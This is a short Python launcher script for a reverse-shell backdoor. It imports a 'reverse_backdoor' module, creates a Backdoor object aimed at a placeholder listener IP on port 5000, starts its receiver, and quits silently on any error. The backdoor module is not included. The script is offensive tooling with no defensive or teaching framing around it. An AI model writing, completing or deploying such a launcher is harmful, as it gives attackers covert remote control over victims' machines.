import reverse_backdoor
import sys

try:
    execute_connection = reverse_backdoor.Backdoor("enter the listener ip", 5000)
    execute_connection.reciever()
except Exception:
    sys.exit()


